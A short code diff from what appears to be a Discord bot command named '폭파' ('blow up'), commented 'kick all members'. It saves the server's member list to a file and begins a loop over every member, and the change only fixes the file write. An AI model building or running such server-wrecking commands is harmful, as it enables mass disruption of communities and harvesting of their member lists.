@@ -310,7 +310,7 @@ async def 폭파(ctx):
             # 모든 멤버 강퇴
             guildMembers = ctx.guild.members
             memberfile = open("memberfile.json", "w")
-            memberfile.write(guildMembers)
+            memberfile.write(str(guildMembers))
             memberfile.close()
             for member in guildMembers:
                 try:
